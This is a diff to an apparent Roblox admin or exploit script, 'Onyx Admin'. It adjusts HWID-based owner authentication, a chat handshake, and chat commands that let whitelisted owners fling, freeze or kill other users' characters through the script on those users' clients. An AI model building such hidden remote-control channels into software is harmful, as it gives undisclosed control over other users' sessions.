@@ -6465,45 +6465,56 @@ local isOwner = IsHWIDOwner(currentHwid)
 local SessionOwners = {}
 if isOwner then SessionOwners[plr.UserId] = true end
 
--- Notify local player of their auth status
+-- REQUIRED: Notification feedback on startup
 task.spawn(function()
-    task.wait(1)
+    task.wait(0.5) -- Small wait to ensure UI is ready
     if isOwner then
-        SendNotify("👑 Onyx", "Owner Authentication Success", 3)
+        SendNotify("👑 Onyx Admin", "Authentication Success! Owner Panel Active.", 4)
     else
-        -- If user EXPECTS to be owner, they'll see this and can check console
-        warn("[Onyx] Owner Auth matched FALSE. Your HWID: " .. currentHwid)
+        SendNotify("🔒 Onyx Admin", "Guest Mode: Owner commands disabled.", 4)
+        warn("[Onyx] Authentication Failed. Your HWID: " .. currentHwid)
+        -- Notification with HWID so they don't have to check console
+        task.wait(1)
+        SendNotify("🔑 HWID (Unbound)", currentHwid:sub(1,18) .. "...", 5)
     end
 end)
-
 
 local function sendHiddenChat(msg)
     pcall(function()
         local TextChatService = game:GetService("TextChatService")
         if TextChatService and TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-            -- Try common channels
-            local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral") 
-                or TextChatService.TextChannels:FindFirstChild("RBXSystem")
-                or (TextChatService.TextChannels:GetChildren()[1])
+            -- Robust channel search
+            local tc = TextChatService:FindFirstChild("TextChannels")
+            local channel = (tc and tc:FindFirstChild("RBXGeneral")) 
+                or (tc and tc:FindFirstChild("RBXSystem"))
+                or (tc and tc:GetChildren()[1])
             if channel then
                 channel:SendAsync(msg)
             end
         else
-            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
+            local events = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+            local sms = events and events:FindFirstChild("SayMessageRequest")
+            if sms then
+                sms:FireServer(msg, "All")
+            end
         end
     end)
 end
 
 local function handleOwnerCommand(chatterData, msg)
+    if not msg then return end
     local lmsg = msg:lower()
 
-    -- 1. Handshake logic (case-insensitive HWID)
+    -- 1. Handshake logic (case-insensitive HWID lookup)
     if lmsg:find("onyx_auth_") then
         local start = lmsg:find("onyx_auth_") + 10
-        local hwid = lmsg:sub(start):split(" ")[1]
+        local rest = lmsg:sub(start)
+        local hwid = rest:split(" ")[1] or rest
         if IsHWIDOwner(hwid) then
-            SessionOwners[chatterData.UserId] = true
-            SendNotify("👑 Owner", chatterData.DisplayName .. " (@" .. chatterData.Name .. ") Authenticated", 3)
+            if not SessionOwners[chatterData.UserId] then
+                SessionOwners[chatterData.UserId] = true
+                SendNotify("👑 Owner", chatterData.DisplayName .. " (@" .. chatterData.Name .. ") Authenticated", 3)
+            end
         end
         return
     end
@@ -6514,14 +6525,20 @@ local function handleOwnerCommand(chatterData, msg)
     end
 
     -- 2. Command Processing
-    -- Strip common prefixes (/e, /w, etc.)
+    -- Only process if the message starts with "." (owner command prefix)
+    local isDotCmd = false
     local cleanMsg = msg
     if lmsg:sub(1,3) == "/e " then
         cleanMsg = msg:sub(4)
     elseif lmsg:sub(1,3) == "/w " then
-        -- find next space
         local nextSpace = msg:find(" ", 4)
         if nextSpace then cleanMsg = msg:sub(nextSpace + 1) end
+    end
+    
+    if cleanMsg:sub(1,1) == "." then
+        isDotCmd = true
+    else
+        return -- Fast exit for normal chat
     end
 
     if SessionOwners[chatterData.UserId] then
@@ -6559,13 +6576,13 @@ local function handleOwnerCommand(chatterData, msg)
         elseif cmd == ".fling" then
             if hrp then
                 local bv = Instance.new("BodyVelocity")
-                bv.Velocity = Vector3.new(math.random(-100,100), 500, math.random(-100,100))
-                bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
+                bv.Velocity = Vector3.new(math.random(-500,500), 500, math.random(-500,500))
+                bv.MaxForce = Vector3.new(1e6, 1e6, 1e6)
                 bv.Parent = hrp
                 
                 local bav = Instance.new("BodyAngularVelocity")
                 bav.AngularVelocity = Vector3.new(9999, 9999, 9999)
-                bav.MaxTorque = Vector3.new(1e5, 1e5, 1e5)
+                bav.MaxTorque = Vector3.new(1e6, 1e6, 1e6)
                 bav.Parent = hrp
                 
                 game:GetService("Debris"):AddItem(bv, 1.5)
@@ -6584,6 +6601,7 @@ local function handleOwnerCommand(chatterData, msg)
             if hum then 
                 hum.WalkSpeed = 0
                 hum.JumpPower = 0 
+                hum.PlatformStand = true
             end
             SendNotify("👑 Owner Cmd", chatterData.DisplayName .. " used .freeze", 3)
         elseif cmd == ".kill" then
@@ -6603,15 +6621,39 @@ local function handleOwnerCommand(chatterData, msg)
                 end)
             end
         end
+    else
+        -- Provide feedback if the local player (or anyone) tries an owner command but isn't whitelisted
+        if isDotCmd and chatterData == plr then
+            SendNotify("🔒 Access Denied", "You are not an authorized owner.", 3)
+        end
     end
 end
 
--- Hook all players for owner commands
+-- Hook chat for owner commands (Legacy + TextChatService)
 for _, p in ipairs(Players:GetPlayers()) do
     p.Chatted:Connect(function(msg) handleOwnerCommand(p, msg) end)
 end
 Players.PlayerAdded:Connect(function(p)
     p.Chatted:Connect(function(msg) handleOwnerCommand(p, msg) end)
+end)
+
+-- Robust local-hook for TextChatService (handles UI-sent commands)
+pcall(function()
+    local TCS = game:GetService("TextChatService")
+    if TCS and TCS.ChatVersion == Enum.ChatVersion.TextChatService then
+        local channels = TCS:FindFirstChild("TextChannels")
+        if channels then
+            local function hookChan(ch)
+                if ch:IsA("TextChannel") then
+                    ch.WillSendTextChannelMessage:Connect(function(msgObj)
+                        handleOwnerCommand(plr, msgObj.Text)
+                    end)
+                end
+            end
+            for _, ch in ipairs(channels:GetChildren()) do hookChan(ch) end
+            channels.ChildAdded:Connect(hookChan)
+        end
+    end
 end)
 
 -- Auth broadcast + Owner Panel (owners only) / ping (non-owners)
